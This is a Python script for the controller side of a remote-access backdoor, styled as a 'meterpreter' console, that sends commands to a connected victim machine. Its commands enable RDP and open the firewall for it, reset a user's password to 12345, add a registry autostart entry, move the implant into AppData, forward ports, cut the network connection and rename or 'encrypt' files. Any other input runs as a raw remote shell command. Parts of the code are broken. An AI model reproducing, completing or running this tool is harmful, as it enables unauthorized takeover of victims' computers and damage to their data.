import socket
import os
import time
from urllib.request import urlopen
import random
from scapy.all import * 
import sys
import win32gui, win32con
from pynput.keyboard import Key, Controller
from cryptography.fernet import Fernet
keyboard = Controller()
fors = 'asbsdajoasjdoijasldjqwlkjdkqlwjdqwkljsdajdasdP'
numb = '12312378123541625353'
ssidss = random.choice(fors)
sssid = random.choice(numb)
ssid = ssidss + sssid
def main():
	host = input("Enter A Host: ")
	port = (int(input("Enter A Port: ")))
	print("Configured to --> {}:{}".format(host, port))
	time.sleep(1)
	s = socket.socket()
	s.bind((host, port))
	print("Session 1 started on {} : {}".format(host, port))
	s.listen(5)
	client, client_addr = s.accept()
	print("Starting meterpreter...")
	time.sleep(1)
	print("Openning...")
	time.sleep(1)
	print("Session completely started!")
	time.sleep(1)
	def meterpreter():
		command = input("meterpreter> ")
		if command == 'cd down':
			kzk = "cd .."
			client.send(kzk.encode())
			rawrr = client.recv(16334)
			karll = rawrr.decode()
			meterpreter()
		if command == 'seeaddr':
			print("Session on {}".format(client_addr))
			meterpreter()
		if command == 'send_msg':
			msg = input("Input a message: ")
			client.send(msg.encode())
			meterpreter()
		if command == 'helpo':
			print('''
?                : Shows this menu
seeaddr          : Shows on what address you are connected to
send_msg         : Sends a msg to the victim
cryptuo          : Encrypts files
ssid             : The session ID
getuser          : Get User's name
mov_ex           : Move the back door in other location
con_rdp          : Connect through RDP (After that you can connect, and have full access.)
usr_in           : Change User's Password (for a back-door effect)
aut_start        : Auto-Start up
stin             : Stops internet connection (WARNING the backdoor will stop)
port_for         : Forwards a port

''')
			meterpreter()
		if command == 'port_for':
			ip_local = input("Enter ip: ")
			ports = input("Input a port: ")
			xxport = client.send(os.system(f"netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport={ports} connectaddress={ip_local} connectport=80"))
			zzport = xxport.encode()
			zzdecode = zzport.decode()
			print("Port forwarded!")
			meterpreter()
		if command == 'stin':
			print("Shutting down..")
			xstin = client.send(os.system("ipconfig /release all").encode())
			zstin = xstin.decode()
			print("Everything has been stopped!")
			meterpreter()
		if command == 'aut_start':
			xzz = input("Input the client file: ")
			xzzz = xzz + ".py"
			xz = client.send("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V '{}' /t REG_SZ /F /D {}".format(xzz,xzzz))
			xzzzz = client.recv(16334)
			xzzzzz = xzzzz.decode()
			print("Done!")
			print(xzzzzz)
		if command == 'adm_in':
			zx = client.send("net user ".encode())
			zxx = client.recv(16334)
			zxxx = zxx.decode()
			print(zxxx)
			user = input("Input a user: ")
			print("Changing password to - 12345")
			zxx = client.send(f"net user {user} 12345".encode())
			zxxxx = client.recv(16334)
			zxxxxx = zxxxx.decode()
			print("Password changed!")
			print(zxxxxx)
			meterpreter()
		if command == 'con_rdp':
			print("Enabling...")
			client.send("reg add 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server' /v fDenyTSConnections /t REG_DWORD /d 0 /f ".encode())
			print("Addded REG..")
			client.send("netsh advfirewall firewall set rule group='remote desktop' new enable=Yes".encode())
			print("Added FIREWALL RULE...")
			client.send("RDP Enabled!")
			meterpreter()
		if command == 'cryptoman':
			try:
				filez = (int(input("Input How many files you want to encrypt(E.G 1): ")))
				for i in range(1,filez):
					e = input("Input a file: ")
					emb = input("Input an emblem (E.G key): ")
					jk = Fernet.generate_key()
					with open(e, 'wb') as gay:
						gay.write(jk)
						client.send("ren {} {}{}".format(e,e,emb).encode())
						vz = "{}{}".format(e,emb)
						client.send("encrypt {}".format(vz).encode())
						print("Encryption successful!")
						meterpreter()
			except FileNotFoundError:
				print("File not found!")
				meterpreter()
		if command == 'mov_ex':
			first = input("What is the name of the file (the client): ")
			print("Moving to a secret place..")
			fz = os.getlogin()
			fzz = client.send(fz.encode())
			fzzz = client.recv(16334)
			fzzzz = fzzz.decode()
			second = client.send('move {} C:\\Users\\{}\\AppData\\'.format(first,fz,fzzzz).encode())
			third = client.recv(16334)
			fourth = third.decode()
			print("Done!")
			print(fourth)
			meterpreter()
		if command == 'getuser':
			print("Getting user's name...")
			name = os.getlogin()
			output = client.send(name.encode())
			rawr = client.recv(16334)
			karl = rawr.decode()
			print("Name: ", karl)
			meterpreter()
		if command == 'ssid':
			print("Session ID: {} ".format(ssid))
			meterpreter()
		if command == 'exit':
			exit = sys.exit()
			exit
		if command == 'cryptuo':
			lk = input("Specify a file: ")
			kl = input("Encrypt Emblem (E.G .key): ")
			encryption = lk + lk
			print("Encrypting...")
			key = Fernet.generate_key()
			with open(lk, "wb") as key_file:
				key_file.write(key)
				client.send("ren {} {}{}".format(lk, lk, kl).encode())
				v = "{}{}".format(lk,kl)
				client.send("encrypt {}".format(v).encode())
				print("Encryption successful!")
				meterpreter()
		if command == 'clear':
			if os == 'nt':
				os.system('cls')
				meterpreter()
			else:
				os.system('clear')
				meterpreter()
		if len(command) == 0:
			meterpreter()
		if command == keyboard.press(Key.enter):
			meterpreter()
		client.send(command.encode())
		output = client.recv(16334)
		output = output.decode()
		print(output)
		meterpreter()
	meterpreter()
main()


